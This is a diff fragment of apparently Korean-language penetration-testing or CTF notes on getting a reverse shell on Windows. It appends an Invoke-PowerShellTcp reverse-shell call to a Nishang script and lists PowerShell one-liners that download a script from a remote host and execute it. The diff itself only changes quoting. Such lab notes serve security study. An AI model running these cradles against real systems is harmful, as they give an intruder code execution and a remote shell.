@@ -115,7 +115,7 @@ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 - `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
 
 ```powershell
-powershell iex(new-object net.webclient).downloadstring("http://10.10.10.10/Invoke-PowerShellTcp.ps1")
+powershell "iex(new-object net.webclient).downloadstring('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
 
 echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
 
